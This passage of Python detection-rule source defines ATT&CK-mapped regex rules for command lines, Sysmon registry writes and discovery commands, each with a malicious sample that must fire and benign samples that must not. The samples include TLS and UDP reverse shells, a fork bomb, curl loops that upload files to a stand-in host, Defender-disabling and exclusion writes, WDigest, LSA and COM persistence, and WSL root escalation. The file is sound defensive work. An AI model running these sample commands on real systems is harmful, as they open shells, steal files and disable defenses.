       [("/usr/bin/bash", "bash -c 'openssl s_client -connect example.com:443 < /dev/null | openssl x509 -noout -dates'")]),
    _l("T1573 T1059", "ncat nc socat",
       r"--ssl\b.*(\s-e\b|\s-c\b|--exec\b|--sh-exec\b)|(\s-e\b|\s-c\b|--exec\b|--sh-exec\b).*--ssl\b"
       r"|OPENSSL:[\w.-]+:\d+.*\b(EXEC|SYSTEM):|\b(EXEC|SYSTEM):.*OPENSSL:[\w.-]+:\d+", "high",
       "shell handed to a TLS-wrapped network utility",
       ("/usr/bin/ncat", "ncat --ssl 198.51.100.7 443 -e /bin/bash"),
       [("/usr/bin/ncat", "ncat --ssl example.com 443")]),
    _w("T1573 T1059", "ncat", r"--ssl\b.*(\s-e\b|--exec\b|--sh-exec\b)|(\s-e\b|--exec\b|--sh-exec\b).*--ssl\b", "high",
       "shell handed to a TLS-wrapped network utility",
       (r"C:\Tools\ncat.exe", "ncat.exe --ssl 198.51.100.7 443 -e cmd.exe"),
       [(r"C:\Tools\ncat.exe", "ncat.exe --ssl example.com 443")]),
    _l("T1095 T1059", "nc ncat netcat socat",
       r"(^|\s)-\w*u\w*\b.*(\s-e\b|\s-c\b|--exec\b|--sh-exec\b)|(\s-e\b|\s-c\b|--exec\b|--sh-exec\b).*\s-\w*u\w*\b"
       r"|\bUDP[46]?(-\w+)?:\S+.*\b(EXEC|SYSTEM):|\b(EXEC|SYSTEM):.*\bUDP[46]?(-\w+)?:", "high",
       "shell carried over UDP by a network utility",
       ("/usr/bin/ncat", "ncat -u 198.51.100.7 53 -e /bin/bash"),
       [("/usr/bin/nc", "nc -u 192.168.1.1 53"),
        ("/usr/bin/nc", "nc -zv 192.168.1.1 22")]),
    _w("T1095 T1059", "nc ncat", r"(^|\s)-\w*u\w*\b.*(\s-e\b|--exec\b)|(\s-e\b|--exec\b).*\s-\w*u\w*\b", "high",
       "shell carried over UDP by a network utility",
       (r"C:\Tools\ncat.exe", "ncat.exe -u 198.51.100.7 53 -e cmd.exe"),
       [(r"C:\Tools\ncat.exe", "ncat.exe -u 192.168.1.1 53")]),
    _l("T1095", "ptunnel ptunnel-ng icmptunnel icmpsh hans pingtunnel", r"\S", "high",
       "tunnel-over-ping tool started",
       ("/usr/sbin/ptunnel-ng", "ptunnel-ng -p 198.51.100.7 -l 2222")),
    _l("T1499", " ".join(SHELLS), r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:", "high",
       "fork bomb on a shell command line",
       ("/usr/bin/bash", "bash -c ':(){ :|:& };:'"),
       [("/usr/bin/bash", "bash -c 'f(){ echo hi; }; f'")]),
    _w("T1499", "cmd", r"%0\s*\|\s*%0|\bfor\s+/l\s+%+\w\s+in\s*\(\s*\)\s*do\s+start\b", "high",
       "fork bomb on a command line",
       (S32 + "cmd.exe", "cmd /c for /l %i in () do start cmd"),
       [(S32 + "cmd.exe", "cmd /c for /l %i in (1,1,5) do echo %i")]),
    _l("T1020 T1567", " ".join(SHELLS),
       r"\b(for|while)\b[^;]*;\s*do\b[^;]*" + _UPLOAD, "high",
       "one command looping over files and uploading each",
       ("/usr/bin/bash", "bash -c 'for f in /home/u/docs/*; do curl -T \"$f\" https://x.example/u/; done'"),
       [("/usr/bin/bash", "bash -c 'for f in *.c; do gcc -c \"$f\"; done'"),
        ("/usr/bin/bash", "bash -c 'for u in a b; do curl -s https://x.example/$u; done'")], quiet=True),
    _l("T1020 T1567", "find", r"-exec\s+(\S*/)?" + _UPLOAD, "high",
       "one command looping over files and uploading each",
       ("/usr/bin/find", "find /home/u/docs -type f -exec curl -T {} https://x.example/u/ ;"),
       [("/usr/bin/find", "find . -name '*.log' -exec gzip {} ;")], quiet=True),
    _w("T1020 T1567", "powershell pwsh",
       r"\b(Get-ChildItem|gci|ls|dir)\b[^|]*\|\s*(%|ForEach(-Object)?)\s*\{[^}]*" + _UPLOAD, "high",
       "one command looping over files and uploading each",
       (PS, r"powershell -c gci C:\Users\u\Documents | % { Invoke-RestMethod https://x.example/u -Method Put -InFile $_.FullName }"),
       [(PS, r"powershell -c gci C:\src | % { Write-Output $_.Name }")], quiet=True),

    # Held at claimed by the coverage map (attackmap.HELD says why for each).
    _w("T1074", "7z 7za 7zr rar winrar", r"\ba\b\s+(-\S+\s+)*\"?" + _STAGING, "low",
       "archive written into a shared staging directory",
       (r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\Users\Public\d.7z C:\Users\u\Documents"),
       [(r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\Users\u\backup\d.7z C:\Users\u\Documents")]),
    _w("T1074", "powershell pwsh", r"Compress-Archive\b[^|;]*-DestinationPath\s+[\"']?" + _STAGING, "low",
       "archive written into a shared staging directory",
       (PS, r"powershell -c Compress-Archive -Path C:\Users\u\Documents -DestinationPath C:\Users\Public\d.zip"),
       [(PS, r"powershell -c Compress-Archive -Path .\dist -DestinationPath .\dist.zip")]),
    _l("T1074", "tar zip 7z", r"\s(/dev/shm|/var/tmp)/\.?[\w.-]+\.(tar|tgz|tar\.gz|zip|7z)\b", "low",
       "archive written into a shared staging directory",
       ("/usr/bin/tar", "tar czf /dev/shm/.d.tgz /home/u/Documents"),
       [("/usr/bin/tar", "tar czf /home/u/backup/d.tgz /home/u/Documents")]),
    _w("T1080", "xcopy cmd powershell pwsh",
       r"\b(copy|xcopy|Copy-Item|cpi)\b[^|;&]*\.(exe|dll|lnk|scr|bat|cmd|vbs|js|hta|ps1)\b\"?\s+(-Destination\s+)?"
       r"[\"']?\\\\[\w.-]+\\(?!(admin|ipc|[a-z])\$)", "medium",
       "program, script or shortcut copied onto a network share",
       (S32 + "cmd.exe", r"cmd /c copy C:\t\Quarterly.lnk \\fs01\finance\Quarterly.lnk"),
       [(S32 + "cmd.exe", r"cmd /c copy C:\t\report.pdf \\fs01\finance\report.pdf"),
        (S32 + "cmd.exe", r"cmd /c copy \\fs01\tools\setup.exe C:\t\setup.exe")]),
    _w("T1491", "reg", r"\badd\b.*\\Control Panel\\Desktop\b.*/v\s+\"?Wallpaper\b", "low",
       "desktop wallpaper changed from a command line",
       (S32 + "reg.exe", r'reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Users\Public\n.bmp /f'),
       [(S32 + "reg.exe", r'reg query "HKCU\Control Panel\Desktop" /v Wallpaper')]),
    _w("T1491", "powershell pwsh",
       r"Set-ItemProperty\b[^|;]*Control Panel\\Desktop[^|;]*\bWallpaper\b|SystemParametersInfo\b[^;]*\b(0x0*14|20)\b",
       "low", "desktop wallpaper changed from a command line",
       (PS, r"powershell -c Set-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value C:\Users\Public\n.bmp"),
       [(PS, r"powershell -c Get-ItemProperty 'HKCU:\Control Panel\Desktop' -Name Wallpaper")]),
    _w("T1678", "ping",
       r"-n\s+(\d{3,}|[3-9]\d)\s+(127\.\d+\.\d+\.\d+|localhost)\b|(127\.\d+\.\d+\.\d+|localhost)\s+-n\s+(\d{3,}|[3-9]\d)\b",
       "low", "loopback ping used as a long sleep",
       (S32 + "PING.EXE", "ping -n 120 127.0.0.1"),
       [(S32 + "PING.EXE", "ping -n 4 127.0.0.1"), (S32 + "PING.EXE", "ping -n 120 192.168.1.1")]),
    _w("T1497", "wmic powershell pwsh", r"\b(MSAcpi_ThermalZoneTemperature|Win32_Fan)\b", "low",
       "query for hardware an emulator lacks (thermal zone or fan)",
       (PS, "powershell -c Get-WmiObject -Namespace root/wmi -Class MSAcpi_ThermalZoneTemperature"),
       [(PS, "powershell -c Get-WmiObject Win32_Processor")]),
    Rule(("T1072",), WIN, ("cmd", "powershell", "pwsh", "wscript", "cscript", "mshta"), r"\S", "medium",
         "a software-deployment agent started a shell",
         (PS, "powershell -nop -c iex $x"),
         ((PS, "powershell -c Get-Date"),),
         parents=("ccmexec", "besclient", "taniumclient", "pdqdeployrunner-1", "pdqdeployrunner-2",
                  "pdqdeployrunner-3", "pdqdeployrunner-4"),
         sample_parent=r"C:\Windows\AdminArsenal\PDQDeployRunner\service-1\PDQDeployRunner-1.exe"),
    _l("T1030", "split", r"(^|\s)(-b\s*\d+|--bytes=\d+)", "low", "file split into fixed-size pieces",
       ("/usr/bin/split", "split -b 5M /tmp/d.tgz /tmp/d.part"),
       [("/usr/bin/split", "split -l 1000 access.log part")]),
    _w("T1030", "7z 7za 7zr rar winrar", r"\ba\b.*\s-v\d+[bkmg]?\b", "low", "archive split into fixed-size volumes",
       (r"C:\Program Files\7-Zip\7z.exe", r"7z a -v5m C:\t\d.7z C:\Users\u\Documents"),
       [(r"C:\Program Files\7-Zip\7z.exe", r"7z a C:\t\d.7z C:\Users\u\Documents")]),
)


# -- WSL boundary (measured 2026-10-21): any process of the Windows user gets
# root inside the distro with `wsl.exe -u root` and no prompt; Windows Sysmon
# records every wsl.exe command line, the Linux side only an unresolved-parent
# root process that docker also produces thousands of times a day. These rules
# are the deterministic path; jarvis/collectors/host/wslguard.py samples the
# facts no event carries. See docs/architecture/WSL-ATTACK-SURFACE.md.
WSL_EXE = r"C:\Program Files\WSL\wsl.exe"
WSL_LAUNCHERS = "ubuntu ubuntu2404 ubuntu2204 ubuntu2004 ubuntu1804 debian kali opensuse-leap"
RULES += (
    _w("T1564 T1548", "wsl", r"(^|\s)(-u|--user)\s+root\b|(^|\s)--system\b", "high",
       "WSL started as root from Windows (no password; root inside the distro)",
       (WSL_EXE, "wsl.exe -d Ubuntu -u root -- bash"),
       [(WSL_EXE, "wsl.exe -d Ubuntu --exec test -r /mnt/c/Windows/System32/cmd.exe"),
        (WSL_EXE, "wsl.exe -d Ubuntu -u alice -- id -u"),
        (WSL_EXE, "wsl.exe ~")]),
    _w("T1564", "wsl", r"(^|\s)--(import|import-in-place|install|mount|debug-shell)\b", "medium",
       "a WSL distribution or disk was added, mounted or opened for debugging from Windows",
       (WSL_EXE, r"wsl.exe --import evil C:\Users\Public\evil C:\Users\Public\evil.tar"),
       [(WSL_EXE, "wsl.exe -l -v"), (WSL_EXE, "wsl.exe --status"),
        (WSL_EXE, "wsl.exe --unmount")]),
    _w("T1489 T1485", "wsl", r"(^|\s)--unregister\b", "critical",
       "a WSL distribution is being unregistered from Windows (its disk and everything in it are deleted)",
       (WSL_EXE, "wsl.exe --unregister Ubuntu"),
       [(WSL_EXE, "wsl.exe --list --verbose")]),
    _w("T1489", "wsl", r"(^|\s)--(shutdown|terminate)\b", "high",
       "WSL shut down or a distribution terminated from Windows (stops the JARVIS engine)",
       (WSL_EXE, "wsl.exe --shutdown"),
       [(WSL_EXE, "wsl.exe -d Ubuntu -- true")]),
    _w("T1548", WSL_LAUNCHERS, r"\bconfig\s+--default-user\s+root\b", "high",
       "a WSL distribution's default user set to root with its launcher",
       (r"C:\Program Files\WindowsApps\CanonicalGroupLimited.Ubuntu24.04LTS_x64\ubuntu2404.exe",
        "ubuntu2404.exe config --default-user root"),
       [(r"C:\Program Files\WindowsApps\CanonicalGroupLimited.Ubuntu24.04LTS_x64\ubuntu2404.exe",
         "ubuntu2404.exe config --default-user alice")]),
)


# ── registry writes (Sysmon event 13) ───────────────────────────────────────
# The same change whatever made it: reg.exe, PowerShell, an installer or an API
# call from an implant. A machine only reports these for the keys its Sysmon
# policy records, so a rule here is silent where the policy is not.
@dataclass(frozen=True, eq=False)
class RegRule:
    tids: tuple
    key: str                # regex over the registry key
    details: str            # regex over the value written
    severity: str
    title: str
    sample: tuple           # (image, key, details) that must fire
    benign: tuple = ()
    family: str = ""        # regex for the wider key family; a write under it shows the policy records it

    def matches(self, key, details):
        return bool(_compiled(self.key).search(key or "")
                    and _compiled(self.details).search(details or ""))


_ZERO, _ONE, _FOUR = r"^DWORD \(0x0+\)$", r"^DWORD \(0x0*1\)$", r"^DWORD \(0x0*4\)$"
# Not ProgramData: its vendor folders are administrator-only, and both Defender's
# own platform path and installer package caches live there (measured: the two
# hits in 752k recorded events were exactly those).
_WRITABLE = r"\\(Users\\|Windows\\Temp\\|Temp\\)"
_SVC = r"HKLM\System\CurrentControlSet\Services" + "\\"
SVCHOST = S32 + "svchost.exe"
_LXSS = r"\\CurrentVersion\\Lxss\\"
_LXSS_DISTRO = _LXSS + r"\{[0-9a-fA-F-]{36}\}\\"
_LXSS_USER = r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Lxss"

REG_RULES = (
    RegRule(("T1686",), r"\\FirewallPolicy\\(Standard|Domain|Public)Profile\\EnableFirewall$", _ZERO,
            "critical", "Windows Firewall profile turned off in the registry",
            (SVCHOST, _SVC + r"SharedAccess\Parameters\FirewallPolicy\StandardProfile\EnableFirewall",
             "DWORD (0x00000000)"),
            ((SVCHOST, _SVC + r"SharedAccess\Parameters\FirewallPolicy\StandardProfile\EnableFirewall",
              "DWORD (0x00000001)"),
             (SVCHOST, _SVC + r"SharedAccess\Parameters\FirewallPolicy\FirewallRules\{1}", "v2.33|Action=Allow")),
            family=r"\\Parameters\\FirewallPolicy\\"),
    RegRule(("T1685", "T1489"),
            r"\\Services\\(WinDefend|Sense|WdNisSvc|wscsvc|SecurityHealthService|mpssvc|Sysmon(64)?"
            r"|EventLog|JarvisNativeSensor)\\Start$", _FOUR,
            "critical", "security service set to disabled in the registry",
            (S32 + "services.exe", _SVC + r"WinDefend\Start", "DWORD (0x00000004)"),
            ((S32 + "services.exe", _SVC + r"WinDefend\Start", "DWORD (0x00000002)"),
             (S32 + "services.exe", _SVC + r"Spooler\Start", "DWORD (0x00000004)")),
            family=r"\\Services\\[^\\]+\\Start$"),
    RegRule(("T1543",), r"\\Services\\[^\\]+\\ImagePath$", _WRITABLE,
            "high", "service program set to a path any user can write",
            (S32 + "services.exe", _SVC + r"Updater\ImagePath", r"C:\Users\Public\u.exe -k svc"),
            ((S32 + "services.exe", _SVC + r"App\ImagePath",
              r'"C:\Program Files\WindowsApps\Vendor.App_1.0_x64\svc.exe"'),
             (S32 + "services.exe", _SVC + r"WinDefend\ImagePath",
              r'"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.1-0\MsMpEng.exe"')),
            family=r"\\Services\\[^\\]+\\ImagePath$"),
    RegRule(("T1547", "T1112"), r"\\CurrentVersion\\Run(Once)?\\[^\\]+$",
            r"\b(powershell|pwsh|mshta|wscript|cscript|rundll32|regsvr32)(\.exe)?\b"
            r"|\\(Windows\\Temp|AppData\\Local\\Temp|Users\\Public)\\",
            "high", "autostart Run value set to a script host or a staging path",
            (r"C:\Users\u\AppData\Local\Temp\a.exe",
             r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
             r"powershell -w hidden -f C:\Users\Public\u.ps1"),
            ((r"C:\Program Files\App\setup.exe",
              r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\RunOnce\Uninstall 1.0",
              r'C:\WINDOWS\system32\cmd.exe /q /c rmdir /s /q "C:\Users\u\AppData\Local\App\1.0"'),
             (r"C:\Users\u\Downloads\vc_redist.x64.exe",
              r"HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce\{0e3bb569}",
              r'"C:\ProgramData\Package Cache\{0e3bb569}\VC_redist.x64.exe" /burn.runonce'),
             (r"C:\Program Files\App\app.exe",
              r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\Run\App",
              r'"C:\Program Files\App\app.exe" --background')),
            family=r"\\CurrentVersion\\Run(Once)?\\"),
    RegRule(("T1546", "T1112"), r"\\Image File Execution Options\\[^\\]+\\Debugger$", r"\S",
            "critical", "Image File Execution Options debugger set in the registry",
            (S32 + "reg.exe",
             r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
             "cmd.exe"),
            ((r"C:\ProgramData\Microsoft\Windows Defender\Platform\MsMpEng.exe",
              r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\x.exe\MitigationOptions",
              "QWORD (0x00501010-0x00000000)"),),
            family=r"\\Image File Execution Options\\"),
    RegRule(("T1003", "T1112"), r"\\WDigest\\UseLogonCredential$", _ONE,
            "critical", "WDigest plaintext credential caching enabled in the registry",
            (S32 + "reg.exe", r"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
             "DWORD (0x00000001)"),
            ((S32 + "reg.exe", r"HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",
              "DWORD (0x00000000)"),),
            family=r"\\SecurityProviders\\WDigest\\"),
    RegRule(("T1123", "T1125", "T1112"),
            r"\\CapabilityAccessManager\\ConsentStore\\(microphone|webcam)(\\NonPackaged)?\\Value$",
            r"^Allow$",
            "medium", "microphone or camera consent switched to Allow in the registry",
            (r"C:\Users\u\AppData\Local\Temp\a.exe",
             r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\Value",
             "Allow"),
            ((S32 + "svchost.exe",
              r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\Value",
              "Deny"),
             (S32 + "svchost.exe",
              r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone\NonPackaged\C:#Users#u#app.exe\LastUsedTimeStart",
              "QWORD (0x01dc3a1b-0x9f2c1e40)"),
             (S32 + "svchost.exe",
              r"HKU\S-1-5-21-1-2-3-1001\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location\Value",
              "Allow")),
            family=r"\\CapabilityAccessManager\\ConsentStore\\"),
    # WSL registration (user hive, writable by any process of the user) and the
    # administrator-only service plugins and policy. Measured 2026-10-21.
    RegRule(("T1548", "T1112"), _LXSS_DISTRO + r"DefaultUid$", _ZERO,
            "high", "WSL distribution default user set to root in the registry",
            (S32 + "reg.exe", _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\DefaultUid",
             "DWORD (0x00000000)"),
            ((r"C:\Program Files\WSL\wslservice.exe",
              _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\DefaultUid", "DWORD (0x000003e8)"),
             (r"C:\Program Files\WSL\wslservice.exe", _LXSS_USER + r"\NatIpAddress", "172.26.56.167")),
            family=_LXSS),
    RegRule(("T1564", "T1112"), _LXSS_DISTRO + r"BasePath$", r"\S",
            "high", "WSL distribution disk location changed in the registry",
            (S32 + "reg.exe", _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\BasePath",
             r"C:\Users\Public\evil"),
            ((r"C:\Program Files\WSL\wslservice.exe",
              _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\State", "DWORD (0x00000001)"),),
            family=_LXSS),
    RegRule(("T1564", "T1112"), _LXSS_DISTRO + r"Flags$", r"\S",
            "medium", "WSL distribution flags changed in the registry (interop, drive mounting, Windows PATH)",
            (S32 + "reg.exe", _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\Flags",
             "DWORD (0x0000000f)"),
            ((r"C:\Program Files\WSL\wslservice.exe",
              _LXSS_USER + r"\{3aa60676-2291-4d89-ba9b-a424d3b0a9a2}\Version", "DWORD (0x00000002)"),),
            family=_LXSS),
    RegRule(("T1547", "T1574"), _LXSS + r"Plugins\\[^\\]+$", r"\S",
            "critical", "WSL service plugin registered in the registry (a DLL the WSL service loads as SYSTEM)",
            (S32 + "reg.exe", r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\Plugins\Updater",
             r"C:\Users\Public\u.dll"),
            ((r"C:\Windows\System32\msiexec.exe",
              r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Lxss\MSI\Version", "2.7.8.0"),),
            family=_LXSS),
    RegRule(("T1564", "T1112"), r"\\Policies\\Microsoft\\Windows\\WSL\\[^\\]+$", r"\S",
            "medium", "WSL group policy value written in the registry",
            (S32 + "reg.exe", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\WSL\AllowCustomKernelUserSetting",
             "DWORD (0x00000001)"),
            ((S32 + "svchost.exe", r"HKLM\SOFTWARE\Policies\Microsoft\Windows\Explorer\NoDriveTypeAutoRun",
              "DWORD (0x000000ff)"),),
            family=r"\\Policies\\Microsoft\\Windows\\WSL\\"),
    # Defence tampering and in-process persistence. The Sysmon baseline records
    # these families since 2026-10-22; until it is applied they prove nothing.
    RegRule(("T1679", "T1112"),
            r"\\Windows Defender\\Exclusions\\(Paths|Processes|Extensions|IpAddresses)\\.+$", r"",
            "high", "Defender exclusion added in the registry",
            (S32 + "reg.exe",
             r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Users\Public",
             "DWORD (0x00000000)"),
            ((S32 + "svchost.exe",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths", "DWORD (0x00000000)"),
             (S32 + "svchost.exe",
              r"HKLM\SOFTWARE\Microsoft\Windows Defender\Features\TamperProtection", "DWORD (0x00000005)")),
            family=r"\\Windows Defender\\Exclusions\\"),
    RegRule(("T1685", "T1112"),
            r"\\Windows Defender\\(Real-Time Protection\\Disable(RealtimeMonitoring|BehaviorMonitoring"
            r"|OnAccessProtection|ScanOnRealtimeEnable|IOAVProtection)|DisableAntiSpyware|DisableAntiVirus)$",
            _ONE, "critical", "Defender real-time protection disabled in the registry",
            (S32 + "reg.exe",
             r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring",
             "DWORD (0x00000001)"),
            ((S32 + "svchost.exe",
              r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRealtimeMonitoring",
              "DWORD (0x00000000)"),),
            family=r"\\Windows Defender\\(Real-Time Protection\\|Disable)"),
    RegRule(("T1546", "T1574"),
            r"\\CLSID\\\{[0-9A-Fa-f-]{36}\}\\InprocServer32\\(\(Default\))?$", _WRITABLE,
            "high", "COM server pointed at a path any user can write (COM hijack)",
            (S32 + "reg.exe",
             r"HKU\S-1-5-21-1-2-3-1001\Software\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32\(Default)",
             r"C:\Users\u\AppData\Local\Temp\x.dll"),
            ((r"C:\Program Files\App\setup.exe",
              r"HKLM\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32\(Default)",
              r"C:\Program Files\App\x.dll"),
             (r"C:\Program Files\App\setup.exe",
              r"HKLM\SOFTWARE\Classes\CLSID\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}\InprocServer32\ThreadingModel",
              "Apartment")),
            family=r"\\CLSID\\.*\\InprocServer32"),
    RegRule(("T1547", "T1556"),
            r"\\Control\\Lsa\\(Security|Authentication|Notification)\s?Packages$", r"\S",
            "critical", "LSA package list changed in the registry (a DLL LSASS will load)",
            (S32 + "reg.exe", r"HKLM\System\CurrentControlSet\Control\Lsa\Security Packages",
             r"kerberos msv1_0 schannel wdigest tspkg pku2u C:\Users\Public\ssp.dll"),
            ((S32 + "lsass.exe", r"HKLM\System\CurrentControlSet\Control\Lsa\OfflineJoin\CurrentValue",
              "DWORD (0x00000001)"),),
            family=r"\\Control\\Lsa\\"),
    RegRule(("T1685", "T1112"),
            r"\\Microsoft\\AMSI\\Providers\\\{[0-9A-Fa-f-]{36}\}(\\[^\\]*)?$", r"",
            "high", "AMSI provider registered or changed in the registry",
            (S32 + "reg.exe",
             r"HKLM\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}\(Default)",
             "Windows Defender"),
            ((S32 + "svchost.exe", r"HKLM\SOFTWARE\Microsoft\AMSI\FeatureBits", "DWORD (0x00000002)"),),
            family=r"\\Microsoft\\AMSI\\Providers\\"),
    RegRule(("T1685", "T1070"),
            r"\\WMI\\Autologger\\(EventLog-[^\\]+|Microsoft-Windows-Sysmon[^\\]*|DefenderApiLogger"
            r"|DefenderAuditLogger|Sysmon[^\\]*)\\Start$", _ZERO,
            "critical", "event trace session disabled in the registry",
            (S32 + "reg.exe", r"HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Security\Start",
             "DWORD (0x00000000)"),
            ((S32 + "svchost.exe", r"HKLM\System\CurrentControlSet\Control\WMI\Autologger\EventLog-Security\Start",
              "DWORD (0x00000001)"),
             (S32 + "svchost.exe", r"HKLM\System\CurrentControlSet\Control\WMI\Autologger\Diagtrack-Listener\Start",
              "DWORD (0x00000000)")),
            family=r"\\WMI\\Autologger\\"),
)


def registry(key, details):
    """Registry rules one value write is evidence of."""
    key, details = (key or "")[:1024], (details or "")[:MAX_CMDLINE]
    return [rule for rule in REG_RULES if rule.matches(key, details)]


def registry_families(key):
    """Titles of the registry rules whose key family this write falls under.

    Seeing any write in a family shows this machine's event policy records it;
    without that, the rule can never fire here and proves nothing here."""
    key = (key or "")[:1024]
    return [rule.title for rule in REG_RULES if rule.family and _compiled(rule.family).search(key)]


# ── discovery ───────────────────────────────────────────────────────────────
# (technique, platform, images, argument pattern). Ordinary one at a time;
# reported only as a burst of distinct techniques under one parent.

def _d(tid, platform, images, pattern=""):
    return (tid, platform, tuple(images.split()), pattern)


DISCOVERY = (
    _d("T1033", WIN, "whoami quser query", r"^(?!.*\b(session|process|termserver)\b)"),
    _d("T1033", LINUX, "whoami who w logname id"),
    _d("T1082", WIN, "systeminfo hostname"),
    _d("T1082", WIN, "wmic", r"\b(os|computersystem|bios)\b"),
    _d("T1082", LINUX, "uname hostnamectl lsb_release hostname"),
    _d("T1016", WIN, "ipconfig"),
    _d("T1016", WIN, "route", r"\bprint\b"),
    _d("T1016", WIN, "netsh", r"\b(interface|wlan)\b.*\bshow\b"),
    _d("T1016", LINUX, "ifconfig"),
    _d("T1016", LINUX, "ip", r"\b(a|addr|address|r|route|link|neigh)\b"),
    _d("T1049", WIN, "netstat"),
    _d("T1049", WIN, "net net1", r"\b(use|session)\b"),
    _d("T1049", LINUX, "ss netstat"),
    _d("T1049", LINUX, "lsof", r"(^|\s)-i\b"),
    _d("T1057", WIN, "tasklist"),
    _d("T1057", WIN, "wmic", r"\bprocess\b(?!\s+call)"),
    _d("T1057", LINUX, "ps pstree top pgrep"),
    _d("T1007", WIN, "sc", r"\b(query|queryex|qc)\b"),
    _d("T1007", WIN, "net net1", r"\bstart\s*$"),
    _d("T1007", WIN, "wmic", r"\bservice\b"),
    _d("T1007", LINUX, "systemctl", r"\b(list-units|list-unit-files|status)\b"),
    _d("T1007", LINUX, "service", r"--status-all"),
    _d("T1012", WIN, "reg", r"\bquery\b"),
    _d("T1083", WIN, "tree where"),
    _d("T1083", WIN, "cmd", r"\bdir\b[^|;&]*\s/s\b"),
    _d("T1083", LINUX, "find locate tree"),
    _d("T1083", LINUX, "ls", r"(^|\s)-\w*R"),
    _d("T1087", WIN, "net net1", r"\b(user|users)\b(?!.*\s/(add|delete|active))"),
    _d("T1087", WIN, "wmic", r"\buseraccount\b"),
    _d("T1087", LINUX, "getent", r"\bpasswd\b"),
    _d("T1087", LINUX, "cat", r"/etc/passwd\b"),
    _d("T1087", LINUX, "lastlog"),
    _d("T1069", WIN, "net net1", r"\b(localgroup|group)\b(?!.*\s/add)"),
    _d("T1069", WIN, "whoami", r"/(groups|all)\b"),
    _d("T1069", LINUX, "groups"),
    _d("T1069", LINUX, "getent", r"\bgroup\b"),
    _d("T1018", WIN, "net net1", r"\bview\b"),
    _d("T1018", WIN, "arp", r"(^|\s)[-/]a\b"),
    _d("T1018", WIN, "nltest", r"/dclist"),
    _d("T1018", LINUX, "arp arp-scan netdiscover"),
    _d("T1135", WIN, "net net1", r"\b(share|view\s+\\\\)"),
    _d("T1135", LINUX, "smbclient", r"(^|\s)-L\b"),
    _d("T1135", LINUX, "showmount"),
    _d("T1124", WIN, "w32tm", r"/(tz|query)\b"),
    _d("T1124", WIN, "net net1", r"\btime\b"),
    _d("T1124", LINUX, "date timedatectl"),
    _d("T1201", WIN, "net net1", r"\baccounts\b"),
    _d("T1201", LINUX, "chage", r"(^|\s)(-l|--list)\b"),
    _d("T1201", LINUX, "cat", r"/etc/(login\.defs|pam\.d/common-password|security/pwquality\.conf)\b"),
    _d("T1615", WIN, "gpresult"),
    _d("T1654", WIN, "wevtutil", r"\b(qe|query-events|el|enum-logs|gl|get-log)\b"),
    _d("T1654", LINUX, "journalctl last lastb"),
    _d("T1654", LINUX, "cat", r"/var/log/(auth\.log|secure|syslog|messages)\b"),
    _d("T1652", WIN, "driverquery"),
    _d("T1652", WIN, "fltmc", r"^(?!.*\bunload\b)"),
    _d("T1652", LINUX, "lsmod modinfo"),
    _d("T1120", WIN, "wmic", r"\b(path\s+win32_pnpentity|usbcontrollerdevice)\b"),
    _d("T1120", WIN, "pnputil", r"/enum-devices"),
    _d("T1120", LINUX, "lsusb lspci"),
    _d("T1680", WIN, "wmic", r"\b(logicaldisk|diskdrive|volume)\b"),
    _d("T1680", WIN, "fsutil", r"\bfsinfo\b"),
    _d("T1680", LINUX, "df lsblk blkid"),
    _d("T1680", LINUX, "fdisk", r"(^|\s)-l\b"),
    _d("T1673", WIN, "wmic", r"\b(computersystem|bios)\b.*\b(model|manufacturer|serialnumber)\b"),
    _d("T1673", LINUX, "systemd-detect-virt virt-what dmidecode"),
    _d("T1518", WIN, "wmic", r"\bproduct\b|antivirusproduct"),
    _d("T1518", LINUX, "dpkg", r"(^|\s)(-l|--list)\b"),
    _d("T1518", LINUX, "rpm", r"(^|\s)-qa\b"),
